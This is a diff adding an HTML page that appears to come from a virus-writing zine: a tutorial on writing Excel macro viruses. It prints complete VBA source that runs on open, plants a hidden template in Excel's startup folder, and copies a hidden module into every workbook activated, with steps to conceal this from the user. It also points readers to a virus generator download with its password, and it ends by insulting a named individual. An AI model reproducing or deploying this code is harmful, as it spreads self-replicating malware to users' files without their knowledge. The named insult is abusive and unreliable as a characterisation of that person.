@@ -1,0 +1,172 @@
+<HTML>
+<HEAD>
+   
+   
+   <TITLE>Tutorials - Excel Tutorial</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><B><FONT COLOR="#004080"><FONT SIZE=+3>Excel Tutorial<BR>
+</FONT><FONT SIZE=+1>By foxz@usa.ne</FONT></FONT></B><FONT SIZE=+1>t</FONT></CENTER>
+
+<HR WIDTH="100%">
+<BLOCKQUOTE>
+<PRE>                   <B>&gt;&gt; The Basic of Excel Virus Writing &lt;&lt;
+
+</B>    Introduction:
+        This first time my TUT on VX zine (SLAM zine), so don't so hard :P 
+
+        Well, as U already know that Excel file(s) can  infected  by virus
+    U  may  ask  who  to  make it?, what toolz  need  to make Excel virus?
+    Excel virus like Word virus, Excel  have macro, Micro$oft like to call 
+    VisualBasicAplication (VBA). Excel Macro is a little program  for help
+    Excel user work "fast and accurate". If User understand Basic they can
+    make his own macro  for help him self to finish his work ( ussualy the 
+    Module containt some formula ), Like Us Macro Coding make own Macro to
+    Infect User data :)
+
+        The 1st Excel Virus  known as DMV created by McNamara, he just try
+    to prove that the Macro  can spread to user WorkSheet, and what U call
+    if a little progy can spread? Yes! A VIRUS!. Now we learn about how to 
+    make Excel Virus.
+
+    Toolz that needed:
+    - Brain (must have)
+    - Computer (recommended)
+    - Excel Prog (recommended)
+    - Cofee and cigarettes (optional)
+    - Paper and pencil (optional)
+    - Metallica (optional)
+
+    Something U Need to Know:
+    - Module:
+      All Code that we create put on Module
+    - Global/Template:
+      The global Template for Ur Virus, place on EXCEL/XLSTART directori
+    - Progy:
+      Small code
+    - WorkBook/WorkSheet
+      Self explaining 
+
+    Infecting Formula:
+        When making virus U need  to know "the engine" for infecting, bcoz
+    if Ur Progy doesn't  have infecting  formula Ur progy can spread!, and
+    Ur progy can't call a virus! and it's become a trojan.
+        Classic infection engine for Excel look like this :
+
+    -Begin-------- checking rutin (Optional to Use) -------------
+    --------------- Use for checking Global/Templates -----------
+
+    Sub  Auto_Open()
+    If cek_global() Then 'check on global! (Optional to use)
+        GoTo FuckSheet:  'found?
+    Else
+        infectglobal     'Goto to Infecting Routine
+    End If
+        FuckSheet:
+        Application.OnSheetActivate = "XXX.XLM!Fuck" 'XXX.XLM is Template
+                                                     'for Ur Virus
+                                                     'Fuck is the MacroName
+                                                     'for infecting
+    bye:
+    End Sub
+
+    Function cek_global() As Boolean 'Yes/No (Flase/True)
+     cek_global = False 'Set False First
+     For x = 1 To Application.Workbooks.Count
+       If Application.Workbooks(x).Name = "XXX.XLM" Then
+          For y = 1 To Application.Workbooks("XXX.XLM").Modules.Count
+           If Application.Workbooks("XXX.XLM").Modules(y).Name = "YYYYY" Then
+              cek_global = True
+              'YYYYY is the module Name for Ur Code 
+           End If
+          Next y
+        End If
+     Next x
+    End Function
+        
+    -End-------- checking rutin (Optional to Use) -------------
+
+    -Begin------ The Brain 0f Ur  Virus is Here ---------------
+
+    Function infectglobal()
+     Activebook = ActiveWorkbook.Name 'Get Active Workbook/WorkSheet
+     Workbooks(activebook).SaveCopyAs Application.StartupPath + "\XXX.XLM"
+     'Make New Template (XXX.XLM) on Excel StarUp Directori (XLSTART)
+     Workbooks.Open (Application.StartupPath + "\XXX.XLM")
+     Windows("XXX.XLM").Visible = False   'Hide Dont let User See our move
+     Application.Workbooks("XXX.XLM").Save   'Save it!
+    End Function
+
+    Sub Fuck()
+     oactivebook = ActiveWorkbook.Name
+     If inFuckIt() Then 'Check WorkSheet are they Infected??
+        GoTo bye2 'If Yes goto Bye2
+     Else 'If no ..... let`s doit!!
+     End If
+
+     Application.ScreenUpdating = False 'Hide from User
+     Application.Windows("XXX.XLM").Visible = True
+     Workbooks("XXX.XLM").Activate  'Activate XXX.XLM/Global/Template
+     Sheets("YYYYY").Visible = True 'Activate/Open the Module Name
+     Workbooks("XXX.XLM").Sheets("YYYYY").Copy Before:=Workbooks(oactivebook).Sheets(1)
+     'Copy Module from template to WorkSheet!
+     Workbooks(oactivebook).Sheets("YYYY").Visible = False 
+     'Hide Sheet !! on file
+     Workbooks("XXX.XLM").Sheets("YYYYY").Visible = False  
+     'Hide Sheet on Global/Template
+     Windows("XXX.XLM").Visible = False 
+     'Hide GLobal/Template
+
+    bye2:
+     Close
+    End Sub
+
+    -End-------- The Brain 0f Ur  Virus is Here ---------------
+
+    -Begin-------- checking rutin (Optional to Use) -------------
+    --------------- Use for checking WorkSheet  -----------------
+
+    Function inFuckIt() As Boolean 'Yes/No (False/True)
+     activebook = ActiveWorkbook.Name 'Use Active WorkSheet
+     inFuckIt = False 'set false first
+     For y = 1 To Application.Workbooks(activebook).Modules.Count
+        If Application.Workbooks(activebook).Modules(y).Name = "YYYYY" Then
+           inFuckIt = True 
+        End If
+     Next y
+    End Function
+
+    -End-------- checking rutin (Optional to Use) -------------
+
+
+    If U understand  what the hell is that U already know the  basic how to
+    make Excel Virus, if  don't or U too  Lazy to coding I have a solution, 
+    just Download N.E.G (NoMercyExcelGenerator) On NoMercyVirusTeam page :
+
+    http://www.focus-asia.com/home/NoMercyVirusTeam/Neg.html
+    The damn password is #virus, and U can add/remove Ur own code
+
+    Greeting infect to :
+        -All SLAM pplz     : VDaemon, Aurodreph, Njoker, RAiD and other
+        -All NoMercy Pplz  : CM, LC, SH, SG
+        -My Best Friend    : Cicatrix, VirusBuster, DarkMan, Aleviru, Avgur, 
+                             Slumdung, Pyro, DarkChasm, B0z0
+        -All Pplz on #virus: Marc, Paw/FS, Yosha/FS, IndianOwl, SpoOky, Dump
+        -All Who fill NoMercyGuestBook
+        -All Slovak VX Pplz "Slovak Rulz!!"
+        -All Indonesian VX : Bengcu, MHK, Anak SMU, Ndeklamber, Victor W,
+                             CristianZ, Prasetyo WD (Yogya rulz)
+
+    Fuck infect to :
+        -Anton Reinhard Pardede also know as Phardera 
+         "Fuck U fucking Lamer!!"
+
+                "More Pplz know Ur ability, more enemy U got"</PRE>
+
+<PRE></PRE>
+</BLOCKQUOTE>
+
+<HR WIDTH="100%">
+</BODY>
+</HTML>
